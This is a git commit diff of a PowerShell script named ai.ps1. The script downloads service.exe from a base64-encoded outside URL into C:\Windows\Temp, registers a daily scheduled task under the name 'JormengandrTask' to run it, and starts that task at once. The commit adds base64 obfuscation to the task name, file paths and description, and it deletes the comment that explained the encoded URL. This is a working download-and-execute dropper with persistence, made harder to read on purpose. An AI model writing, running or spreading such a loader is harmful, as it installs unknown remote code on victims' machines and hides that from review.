308f0cf60343fe6891a47e2aa1a165b86c65c0c2
itssixtyn3in <130003354+itssixtyn3in@users.noreply.github.com>
2025-05-12 09:19:31 -0700

    Update ai.ps1

--- ai.ps1
+++ ai.ps1
@@ -1,23 +1,22 @@
-$A1 = "JormengandrTask"
-$B2 = "C:\Temp\service.exe"
-$C3 = "13:37"  
-$D4 = "Jormungand Task to run service executable"
+$A1 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Sm9ybWVuZ2FuZHJUYXNr"))
+$B2 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcVGVtcFxzZXJ2aWNlLmV4ZQ=="))
+$C3 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("MTM6Mzc="))
+$D4 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Sm9ybXVuZ2FuZCBUYXNrIHRvIHJ1biBzZXJ2aWNlIGV4ZWN1dGFibGU="))
 
-# Base64 encoded web address for the service binary URL
 $E5 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9nZWxkZ2lmdC5jb20vc2VydmljZS5leGU="))
-$F6 = "C:\Windows\Temp\service.exe"
+$F6 = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("QzpcV2luZG93c1xUZW1wXHNlcnZpY2UuZXhl"))
 
 $G7 = $E5
 $H8 = $F6
 
 try {
-    Invoke-WebRequest -Uri $G7 -OutFile $H8 -UseBasicP
+    Invoke-WebRequest -Uri $G7 -OutFile $H8
 } catch {
     exit 1
 }
 
 $I9 = New-ScheduledTaskAction -Execute $H8
 $J10 = New-ScheduledTaskTrigger -Daily -At $C3
-Register-ScheduledTask -TaskName $A1 -Action $I9 -Trigger $J10 -Description $D4
+$task1 = Register-ScheduledTask -TaskName $A1 -Action $I9 -Trigger $J10 -Description $D4
 
 Start-ScheduledTask -TaskName $A1
